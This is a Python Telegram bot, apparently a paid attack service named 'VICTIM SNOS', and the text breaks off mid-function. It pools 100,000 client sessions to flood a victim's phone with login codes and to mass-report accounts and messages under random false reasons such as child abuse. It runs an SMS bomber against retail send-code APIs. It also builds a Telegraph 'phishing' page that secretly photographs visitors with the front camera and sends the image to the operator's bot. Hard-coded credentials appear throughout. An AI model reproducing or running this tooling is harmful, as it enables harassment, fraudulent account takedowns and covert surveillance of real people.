import asyncio
import aiohttp
import random
import json
import os
import logging
import time
import re
import hashlib
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Set
from dataclasses import dataclass, field
from collections import deque

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, LabeledPrice, PreCheckoutQuery
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait, RPCError
from pyrogram.raw import types as raw_types
from pyrogram.raw.functions.account import ReportPeer
from pyrogram.raw.functions.messages import Report

# ---------- КОНФИГУРАЦИЯ ----------
BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"
PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
BANNER_FILE = "banner.png"

# Настройки атак
TOTAL_SESSIONS = 100000
REQUESTS_PER_ROUND = 300
MAX_ROUNDS = 5
COOLDOWN_SECONDS = 300  # 5 минут между атаками
SESSION_BATCH_SIZE = 500  # Создаем сессии батчами

PRICES = {
    "30d": {"stars": 100, "rub": 100},
    "60d": {"stars": 200, "rub": 200},
    "forever": {"stars": 400, "rub": 400}
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]

DEVICES = [
    {"model": "iPhone 15 Pro Max", "system": "iOS 17.3.1"},
    {"model": "iPhone 15 Pro", "system": "iOS 17.3"},
    {"model": "iPhone 14 Pro Max", "system": "iOS 17.2.1"},
    {"model": "iPhone 14 Pro", "system": "iOS 17.2"},
    {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
    {"model": "Samsung Galaxy S23 Ultra", "system": "Android 14"},
    {"model": "Google Pixel 8 Pro", "system": "Android 14"},
    {"model": "Xiaomi 14 Pro", "system": "Android 14"},
]

# Рабочие эндпоинты для бомбера
BOMBER_ENDPOINTS = [
    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.citilink.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.avito.ru/auth/v1/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.lenta.com/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.perekrestok.ru/v1/auth/send-sms", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.magnit.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.mvideo.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
    {"url": "https://api.eldorado.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
]

REPORT_REASONS = [
    raw_types.InputReportReasonSpam(),
    raw_types.InputReportReasonViolence(),
    raw_types.InputReportReasonPornography(),
    raw_types.InputReportReasonChildAbuse(),
    raw_types.InputReportReasonOther(),
    raw_types.InputReportReasonCopyright(),
]

# ---------- ЛОГГИРОВАНИЕ ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ---------- ИНИЦИАЛИЗАЦИЯ БОТА ----------
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ---------- ДАТАКЛАССЫ ----------
@dataclass
class SmartSession:
    """Умная сессия с отслеживанием состояния"""
    client: Client
    index: int
    in_use: bool = False
    flood_until: float = 0
    last_used: float = 0
    fail_count: int = 0
    success_count: int = 0
    
    @property
    def is_available(self) -> bool:
        now = time.time()
        return (not self.in_use and 
                self.flood_until < now and 
                now - self.last_used >= 1.5)
    
    @property
    def health_score(self) -> float:
        """Оценка здоровья сессии (0-100)"""
        if self.fail_count > 10:
            return 0
        total = self.success_count + self.fail_count
        if total == 0:
            return 100
        return (self.success_count / total) * 100

@dataclass
class SessionPool:
    """Пул из 100,000 умных сессий"""
    sessions: List[SmartSession] = field(default_factory=list)
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    creation_lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    is_ready: bool = False
    _creation_task: Optional[asyncio.Task] = None
    
    async def get_available(self, count: int) -> List[SmartSession]:
        """Получить count доступных сессий"""
        async with self.lock:
            available = [s for s in self.sessions if s.is_available]
            
            # Сортируем по здоровью и времени последнего использования
            available.sort(key=lambda s: (-s.health_score, s.last_used))
            
            selected = available[:count]
            for s in selected:
                s.in_use = True
                s.last_used = time.time()
            
            return selected
    
    def release(self, sessions: List[SmartSession]):
        """Освободить сессии"""
        for s in sessions:
            if s:
                s.in_use = False
    
    def mark_success(self, session: SmartSession):
        """Отметить успешное использование"""
        session.success_count += 1
    
    def mark_fail(self, session: SmartSession):
        """Отметить неудачное использование"""
        session.fail_count += 1
    
    def mark_flood(self, session: SmartSession, wait_seconds: int):
        """Отметить flood wait"""
        session.flood_until = time.time() + wait_seconds
    
    def get_stats(self) -> dict:
        """Статистика пула"""
        total = len(self.sessions)
        available = sum(1 for s in self.sessions if s.is_available)
        healthy = sum(1 for s in self.sessions if s.health_score > 50)
        return {
            "total": total,
            "available": available,
            "healthy": healthy,
            "ready": self.is_ready
        }

# Глобальный пул сессий
global_session_pool = SessionPool()

# ---------- ХРАНИЛИЩА ----------
ALLOWED_USERS: Dict[str, dict] = {}
active_attacks: Dict[int, asyncio.Event] = {}
user_last_action: Dict[int, float] = {}
user_action_locks: Dict[int, asyncio.Lock] = {}
promo_codes: Dict[str, dict] = {}
phish_pages: Dict[str, dict] = {}

# ---------- FSM СОСТОЯНИЯ ----------
class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_username = State()
    waiting_count = State()
    waiting_link = State()
    waiting_title = State()

class AdminState(StatesGroup):
    waiting_user_id = State()
    waiting_promo_code = State()
    waiting_promo_days = State()
    waiting_promo_uses = State()

class PurchaseState(StatesGroup):
    waiting_promo = State()

# ---------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----------
def load_json(file: str, default: dict = None) -> dict:
    """Безопасная загрузка JSON"""
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default or {}

def save_json(file: str, data: dict):
    """Безопасное сохранение JSON"""
    try:
        with open(file, 'w') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to save {file}: {e}")

def load_allowed_users():
    global ALLOWED_USERS
    ALLOWED_USERS = load_json(ALLOWED_USERS_FILE, {})

def save_allowed_users():
    save_json(ALLOWED_USERS_FILE, ALLOWED_USERS)

def load_promo_codes():
    global promo_codes
    promo_codes = load_json("promo_codes.json", {})

def save_promo_codes():
    save_json("promo_codes.json", promo_codes)

def is_user_allowed(user_id: int) -> bool:
    """Проверка доступа пользователя"""
    if user_id == ADMIN_ID:
        return True
    user_id_str = str(user_id)
    if user_id_str not in ALLOWED_USERS:
        return False
    expire = ALLOWED_USERS[user_id_str].get("expire_date")
    if expire and expire != "forever":
        try:
            return datetime.now() <= datetime.fromisoformat(expire)
        except:
            return False
    return True

def add_subscription(user_id: int, days: int = None, forever: bool = False):
    """Добавление подписки"""
    user_id_str = str(user_id)
    if forever:
        expire = "forever"
    else:
        expire = (datetime.now() + timedelta(days=days)).isoformat()
    ALLOWED_USERS[user_id_str] = {
        "expire_date": expire,
        "added": datetime.now().isoformat()
    }
    save_allowed_users()

async def check_cooldown(user_id: int) -> tuple[bool, float]:
    """Проверка кулдауна между атаками"""
    now = time.time()
    if user_id in user_last_action:
        elapsed = now - user_last_action[user_id]
        if elapsed < COOLDOWN_SECONDS:
            return False, COOLDOWN_SECONDS - elapsed
    return True, 0

def set_cooldown(user_id: int):
    """Установка кулдауна"""
    user_last_action[user_id] = time.time()

async def get_user_lock(user_id: int) -> asyncio.Lock:
    """Получить блокировку для пользователя"""
    if user_id not in user_action_locks:
        user_action_locks[user_id] = asyncio.Lock()
    return user_action_locks[user_id]

async def check_channel_subscription(user_id: int) -> bool:
    """Проверка подписки на канал"""
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

# ---------- СОЗДАНИЕ ПУЛА СЕССИЙ ----------
async def create_single_session(index: int) -> Optional[SmartSession]:
    """Создание одной сессии"""
    try:
        device = random.choice(DEVICES)
        session_file = f"sessions/session_{index}"
        
        client = Client(
            name=session_file,
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=False,
            no_updates=True,
            device_model=device["model"],
            system_version=device["system"],
            app_version="10.15.1",
            lang_code="ru"
        )
        
        await client.connect()
        
        # Проверяем что сессия работает
        await client.get_me()
        
        return SmartSession(client=client, index=index)
    except Exception as e:
        logger.debug(f"Failed to create session {index}: {e}")
        return None

async def create_session_batch(start_idx: int, count: int) -> List[SmartSession]:
    """Создание батча сессий"""
    tasks = []
    for i in range(start_idx, start_idx + count):
        tasks.append(create_single_session(i))
        await asyncio.sleep(0.05)  # Небольшая задержка между созданиями
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    sessions = []
    for r in results:
        if isinstance(r, SmartSession):
            sessions.append(r)
    
    return sessions

async def initialize_session_pool():
    """Инициализация пула из 100,000 сессий"""
    global global_session_pool
    
    async with global_session_pool.creation_lock:
        if global_session_pool.is_ready:
            return
        
        logger.info(f"Starting session pool initialization: {TOTAL_SESSIONS} sessions")
        
        os.makedirs("sessions", exist_ok=True)
        
        created = 0
        batch_size = SESSION_BATCH_SIZE
        
        while created < TOTAL_SESSIONS:
            remaining = TOTAL_SESSIONS - created
            current_batch = min(batch_size, remaining)
            
            logger.info(f"Creating batch: {created}-{created + current_batch}")
            
            new_sessions = await create_session_batch(created, current_batch)
            global_session_pool.sessions.extend(new_sessions)
            
            created += current_batch
            
            stats = global_session_pool.get_stats()
            logger.info(f"Pool stats: {stats['total']} total, {stats['available']} available")
            
            # Сохраняем прогресс
            if created % 10000 == 0:
                logger.info(f"Progress: {created}/{TOTAL_SESSIONS} sessions created")
        
        global_session_pool.is_ready = True
        logger.info(f"Session pool ready: {len(global_session_pool.sessions)} sessions")

async def maintain_session_pool():
    """Поддержание пула сессий в рабочем состоянии"""
    while True:
        try:
            await asyncio.sleep(60)  # Проверка каждую минуту
            
            if not global_session_pool.is_ready:
                continue
            
            # Восстанавливаем упавшие сессии
            dead_sessions = []
            for s in global_session_pool.sessions:
                if s.health_score < 10 and not s.in_use:
                    dead_sessions.append(s)
            
            if dead_sessions:
                logger.info(f"Recovering {len(dead_sessions)} dead sessions")
                for s in dead_sessions[:100]:  # Не больше 100 за раз
                    try:
                        if s.client and s.client.is_connected:
                            await s.client.disconnect()
                    except:
                        pass
                    global_session_pool.sessions.remove(s)
                
                # Создаем новые сессии вместо упавших
                new_start = len(global_session_pool.sessions)
                new_sessions = await create_session_batch(new_start, len(dead_sessions))
                global_session_pool.sessions.extend(new_sessions)
                
        except Exception as e:
            logger.error(f"Session pool maintenance error: {e}")

# ---------- АТАКИ ----------
async def send_code_via_session(session: SmartSession, phone: str) -> bool:
    """Отправка кода через сессию"""
    try:
        client = session.client
        if not client.is_connected:
            await client.connect()
        
        await client.send_code(phone)
        global_session_pool.mark_success(session)
        return True
    except FloodWait as e:
        global_session_pool.mark_flood(session, e.value)
        return False
    except Exception as e:
        global_session_pool.mark_fail(session)
        return False

async def report_account_via_session(session: SmartSession, username: str) -> bool:
    """Жалоба на аккаунт через сессию"""
    try:
        client = session.client
        if not client.is_connected:
            await client.connect()
        
        user = await client.get_users(username)
        peer = await client.resolve_peer(user.id)
        
        reason = random.choice(REPORT_REASONS)
        await client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
        
        global_session_pool.mark_success(session)
        return True
    except Exception as e:
        global_session_pool.mark_fail(session)
        return False

async def report_message_via_session(session: SmartSession, channel: str, msg_id: int) -> bool:
    """Жалоба на сообщение через сессию"""
    try:
        client = session.client
        if not client.is_connected:
            await client.connect()
        
        chat = await client.get_chat(channel)
        peer = await client.resolve_peer(chat.id)
        
        await client.invoke(Report(
            peer=peer,
            id=[msg_id],
            reason=raw_types.InputReportReasonSpam(),
            message="Spam"
        ))
        
        global_session_pool.mark_success(session)
        return True
    except Exception as e:
        global_session_pool.mark_fail(session)
        return False

async def snos_attack_phone(
    user_id: int,
    phone: str,
    rounds: int,
    stop_event: asyncio.Event,
    progress_callback=None
) -> int:
    """Атака сноса по номеру телефона"""
    total_sent = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        # Получаем 300 сессий для раунда
        sessions = await global_session_pool.get_available(REQUESTS_PER_ROUND)
        
        if not sessions:
            logger.warning(f"No sessions available for round {rnd}")
            break
        
        # Отправляем запросы параллельно
        tasks = [send_code_via_session(s, phone) for s in sessions]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Освобождаем сессии
        global_session_pool.release(sessions)
        
        # Считаем успешные
        round_sent = sum(1 for r in results if r is True)
        total_sent += round_sent
        
        if progress_callback:
            await progress_callback(rnd, rounds, total_sent)
        
        if rnd < rounds:
            await asyncio.sleep(1.5)  # Пауза между раундами
    
    return total_sent

async def snos_attack_username(
    user_id: int,
    username: str,
    rounds: int,
    stop_event: asyncio.Event,
    progress_callback=None
) -> int:
    """Атака сноса по username"""
    total_reports = 0
    username = username.strip().replace("@", "")
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        # Получаем 300 сессий
        sessions = await global_session_pool.get_available(REQUESTS_PER_ROUND)
        
        if not sessions:
            logger.warning(f"No sessions available for round {rnd}")
            break
        
        # Отправляем жалобы
        tasks = [report_account_via_session(s, username) for s in sessions]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Освобождаем сессии
        global_session_pool.release(sessions)
        
        round_reports = sum(1 for r in results if r is True)
        total_reports += round_reports
        
        if progress_callback:
            await progress_callback(rnd, rounds, total_reports)
        
        if rnd < rounds:
            await asyncio.sleep(1)
    
    return total_reports

async def mass_report_message(user_id: int, link: str) -> tuple[int, str]:
    """Массовая жалоба на сообщение"""
    # Парсим ссылку
    patterns = [
        r't\.me/([^/]+)/(\d+)',
        r'telegram\.me/([^/]+)/(\d+)'
    ]
    
    channel = None
    msg_id = None
    
    for pattern in patterns:
        match = re.search(pattern, link)
        if match:
            channel = match.group(1)
            msg_id = int(match.group(2))
            break
    
    if not channel or not msg_id:
        return 0, "Неверная ссылка"
    
    # Получаем сессии
    sessions = await global_session_pool.get_available(300)
    
    if not sessions:
        return 0, "Нет доступных сессий"
    
    # Отправляем жалобы
    tasks = [report_message_via_session(s, channel, msg_id) for s in sessions]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    global_session_pool.release(sessions)
    
    reports = sum(1 for r in results if r is True)
    return reports, None

async def bomber_attack(
    phone: str,
    rounds: int,
    user_id: int,
    stop_event: asyncio.Event,
    progress_callback=None
) -> int:
    """SMS бомбер"""
    total_sent = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            for endpoint in BOMBER_ENDPOINTS:
                for _ in range(30):  # 10 эндпоинтов * 30 = 300 запросов
                    tasks.append(send_bomber_request(session, phone, endpoint))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            if progress_callback:
                await progress_callback(rnd, rounds, total_sent)
            
            if rnd < rounds:
                await asyncio.sleep(0.5)
    
    return total_sent

async def send_bomber_request(session: aiohttp.ClientSession, phone: str, endpoint: dict) -> bool:
    """Отправка запроса бомбера"""
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        data = {endpoint["phone_field"]: phone.replace("+", "")}
        
        async with session.post(
            endpoint["url"],
            headers=headers,
            json=data,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False
        ) as resp:
            return resp.status < 500
    except:
        return False

# ---------- ФИШИНГ ----------
PHISH_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }}
        #container {{
            position: relative;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }}
        video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        #overlay {{
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding: 20px;
            pointer-events: none;
        }}
        #status {{
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 12px 24px;
            border-radius: 30px;
            font-size: 14px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            pointer-events: none;
        }}
        canvas {{
            display: none;
        }}
    </style>
</head>
<body>
    <div id="container">
        <video id="video" autoplay playsinline></video>
        <div id="overlay">
            <div id="status">📸 Loading camera...</div>
        </div>
    </div>
    <canvas id="canvas"></canvas>
    
    <script>
        const CONFIG = {{
            bot: "{bot_token}",
            chat: "{chat_id}",
            pageId: "{page_id}"
        }};
        
        let sent = false;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        
        async function initCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        facingMode: "user",
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }}
                    }}
                }});
                
                video.srcObject = stream;
                status.textContent = '📸 Camera ready';
                
                // Ждем загрузку видео
                await new Promise(resolve => {{
                    video.onloadedmetadata = () => {{
                        resolve();
                    }};
                }});
                
                // Делаем фото
                setTimeout(() => captureAndSend(stream), 1500);
                
            }} catch(e) {{
                status.textContent = '❌ Camera access denied';
                console.error('Camera error:', e);
            }}
        }}
        
        async function captureAndSend(stream) {{
            if (sent) return;
            
            try {{
                const ctx = canvas.getContext('2d');
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                status.textContent = '📤 Sending...';
                
                // Конвертируем в blob
                const blob = await new Promise(resolve => {{
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                }});
                
                // Отправляем в Telegram
                const formData = new FormData();
                formData.append('chat_id', CONFIG.chat);
                formData.append('photo', blob, `photo_${{CONFIG.pageId}}.jpg`);
                formData.append('caption', `📸 Photo captured | ID: ${{CONFIG.pageId}}`);
                
                const response = await fetch(
                    `https://api.telegram.org/bot${{CONFIG.bot}}/sendPhoto`,
                    {{ method: 'POST', body: formData }}
                );
                
                const data = await response.json();
                
                if (data.ok) {{
                    sent = true;
                    status.textContent = '✅ Photo sent successfully';
                    
                    // Останавливаем камеру
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Перенаправляем
                    setTimeout(() => {{
                        window.location.href = 'https://telegram.org/';
                    }}, 2000);
                }} else {{
                    status.textContent = '❌ Send failed, retrying...';
                    setTimeout(() => captureAndSend(stream), 2000);
                }}
                
            }} catch(e) {{
                console.error('Capture error:', e);
                status.textContent = '❌ Error, retrying...';
                setTimeout(() => captureAndSend(stream), 2000);
            }}
        }}
        
        // Запускаем
        initCamera();
    </script>
</body>
</html>'''

async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Optional[str]:
    """Создание фишинговой страницы на Telegraph"""
    try:
        html = PHISH_HTML.format(
            title=title,
            bot_token=BOT_TOKEN,
            chat_id=chat_id,
            page_id=page_id
        )
        
        async with aiohttp.ClientSession() as session:
            # Создаем аккаунт
            account_data = {
                "short_name": f"Support{random.randint(10000, 99999)}",
                "author_name": "Telegram Security",
                "author_url": "https://t.me/telegram"
            }
            
            async with session.post(
                "https://api.telegra.ph/createAccount",
                json=account_data,
                timeout=10
            ) as resp:
                data = await resp.json()
                if not data.get("ok"):
                    return None
                access_token = data["result"]["access_token"]
            
            # Создаем страницу
            page_data = {
                "access_token": access_token,
                "title": title,
                "author_name": "Telegram Security",
                "content": [
                    {"tag": "p", "children": ["Loading security check..."]},
                    {"tag": "p", "children": [html]}
                ],
                "return_content": False
            }
            
            async with session.post(
                "https://api.telegra.ph/createPage",
                json=page_data,
                timeout=10
            ) as resp:
                data = await resp.json()
                if data.get("ok"):
                    url = data["result"]["url"]
                    phish_pages[page_id] = {
                        "url": url,
                        "chat_id": chat_id,
                        "created": time.time()
                    }
                    return url
                    
    except Exception as e:
        logger.error(f"Phishing page creation error: {e}")
    
    return None

# ---------- UI КОМПОНЕНТЫ ----------
def create_button(text: str, callback_data: str) -> InlineKeyboardButton:
    """Создание кнопки"""
    return InlineKeyboardButton(text=text, callback_data=callback_data)

def create_keyboard(buttons: List[List[tuple]], adjust: int = 1) -> InlineKeyboardMarkup:
    """Создание клавиатуры"""
    builder = InlineKeyboardBuilder()
    for row in buttons:
        for text, data in row:
            builder.button(text=text, callback_data=data)
    builder.adjust(adjust)
    return builder.as_markup()

def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    """Главное меню"""
    buttons = [
        [("🎯 СНОС", "snos_menu")],
        [("💣 БОМБЕР", "bomber_menu")],
        [("🎣 ФИШИНГ", "phish_menu")],
        [("💰 КУПИТЬ", "purchase_menu")],
        [("📊 СТАТУС", "status"), ("⏹ СТОП", "stop")]
    ]
    
    if user_id == ADMIN_ID:
        buttons.append([("👑 АДМИН", "admin_menu")])
    
    return create_keyboard(buttons, adjust=2)

def get_snos_menu() -> InlineKeyboardMarkup:
    """Меню сноса"""
    buttons = [
        [("📱 По номеру", "snos_phone")],
        [("👤 По username", "snos_username")],
        [("💬 Жалоба на сообщение", "report_message")],
        [("◀️ НАЗАД", "main_menu")]
    ]
    return create_keyboard(buttons)

async def send_message_with_banner(
    target,
    text: str,
    markup: InlineKeyboardMarkup = None
):
    """Отправка сообщения с баннером"""
    full_text = f"<b>🔱 VICTIM SNOS</b>\n\n{text}"
    
    try:
        if os.path.exists(BANNER_FILE):
            if hasattr(target, 'answer_photo'):
                return await target.answer_photo(
                    FSInputFile(BANNER_FILE),
                    caption=full_text,
                    reply_markup=markup
                )
            else:
                return await bot.send_photo(
                    target if isinstance(target, int) else target.chat.id,
                    FSInputFile(BANNER_FILE),
                    caption=full_text,
                    reply_markup=markup
                )
    except:
        pass
    
    # Если нет баннера или ошибка - отправляем текст
    if hasattr(target, 'answer'):
        return await target.answer(full_text, reply_markup=markup)
    else:
        return await bot.send_message(
            target if isinstance(target, int) else target.chat.id,
            full_text,
            reply_markup=markup
        )

# ---------- ОБРАБОТЧИКИ КОМАНД ----------
@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    """Обработчик /start"""
    user_id = msg.from_user.id
    await msg.delete()
    
    # Проверка подписки на канал
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(
            msg,
            f"⚠️ Для использования бота подпишитесь на канал:\n\n{CHANNEL_URL}"
        )
        return
    
    # Проверка доступа
    if not is_user_allowed(user_id):
        await send_message_with_banner(
            msg,
            f"❌ Доступ запрещен.\n\n"
            f"Ваш ID: <code>{user_id}</code>\n\n"
            f"Приобретите доступ в меню ниже:",
            get_purchase_menu()
        )
        return
    
    # Проверяем готовность пула сессий
    if not global_session_pool.is_ready:
        asyncio.create_task(initialize_session_pool())
        await send_message_with_banner(
            msg,
            "🔄 Инициализация сессий...\nПожалуйста, подождите минуту.",
            InlineKeyboardMarkup(inline_keyboard=[
                [create_button("🔄 Проверить готовность", "check_ready")]
            ])
        )
        return
    
    stats = global_session_pool.get_stats()
    await send_message_with_banner(
        msg,
        f"✅ Бот готов к работе\n"
        f"📊 Доступно сессий: {stats['available']}/{stats['total']}",
        get_main_menu(user_id)
    )

@dp.callback_query(F.data == "check_ready")
async def check_ready(cb: types.CallbackQuery):
    """Проверка готовности пула"""
    if global_session_pool.is_ready:
        stats = global_session_pool.get_stats()
        await cb.message.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                   f"✅ Пул сессий готов!\n"
                   f"📊 Доступно: {stats['available']}/{stats['total']}",
            reply_markup=get_main_menu(cb.from_user.id)
        )
    else:
        await cb.answer("⏳ Сессии еще создаются...", show_alert=True)
        await asyncio.sleep(2)
        await check_ready(cb)

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    """Меню сноса"""
    # Проверка кулдауна
    can_attack, remaining = await check_cooldown(cb.from_user.id)
    if not can_attack:
        await cb.answer(
            f"⏳ Подождите {int(remaining)} сек. перед следующей атакой",
            show_alert=True
        )
        return
    
    # Проверка активных атак
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ У вас уже есть активная атака!", show_alert=True)
        return
    
    await cb.message.edit_caption(
        caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите тип сноса:",
        reply_markup=get_snos_menu()
    )

@dp.callback_query(F.data == "snos_phone")
async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
    """Начало сноса по номеру"""
    user_lock = await get_user_lock(cb.from_user.id)
    
    async with user_lock:
        # Проверки
        if cb.from_user.id in active_attacks:
            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
            return
        
        can_attack, remaining = await check_cooldown(cb.from_user.id)
        if not can_attack:
            await cb.answer(
                f"⏳ Подождите {int(remaining)} сек.",
                show_alert=True
            )
            return
    
    await state.set_state(AttackState.waiting_phone)
    await cb.message.delete()
    
    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
        [create_button("❌ Отмена", "snos_menu")]
    ])
    
    await cb.message.answer(
        "<b>🔱 VICTIM SNOS</b>\n\n"
        "📱 Введите номер телефона:\n"
        "<i>Пример: +79123456789</i>",
        reply_markup=cancel_kb
    )

@dp.message(StateFilter(AttackState.waiting_phone))
async def snos_phone_received(msg: types.Message, state: FSMContext):
    """Получен номер телефона"""
    phone = msg.text.strip()
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    
    await msg.delete()
    await msg.answer(
        f"<b>🔱 VICTIM SNOS</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n\n"
        f"Введите количество раундов (1-{MAX_ROUNDS}):"
    )

@dp.message(StateFilter(AttackState.waiting_count))
async def snos_count_received(msg: types.Message, state: FSMContext):
    """Получено количество раундов"""
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_message_with_banner(
            msg,
            f"❌ Введите число от 1 до {MAX_ROUNDS}!"
        )
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    # Устанавливаем кулдаун и блокировку
    user_lock = await get_user_lock(user_id)
    
    async with user_lock:
        if user_id in active_attacks:
            await send_message_with_banner(msg, "❌ Атака уже запущена!")
            return
        
        stop_event = asyncio.Event()
        active_attacks[user_id] = stop_event
    
    # Отправляем начальное сообщение
    status_msg = await send_message_with_banner(
        msg,
        f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n"
        f"📱 Телефон: <code>{phone}</code>\n"
        f"🔄 Раунд: 0/{rounds}\n"
        f"📤 Отправлено: 0\n\n"
        f"<i>Используется до {REQUESTS_PER_ROUND} сессий на раунд</i>"
    )
    
    # Callback для обновления прогресса
    async def update_progress(current: int, total: int, sent: int):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                       f"🎯 <b>СНОС АКТИВЕН</b>\n\n"
                       f"📱 Телефон: <code>{phone}</code>\n"
                       f"🔄 Раунд: {current}/{total}\n"
                       f"📤 Отправлено: {sent}\n"
                       f"⚡ Сессий: {REQUESTS_PER_ROUND}/раунд",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                ])
            )
        except:
            pass
    
    # Запускаем атаку
    try:
        total_sent = await snos_attack_phone(
            user_id,
            phone,
            rounds,
            stop_event,
            update_progress
        )
        
        # Устанавливаем кулдаун
        set_cooldown(user_id)
        
        # Финальное сообщение
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
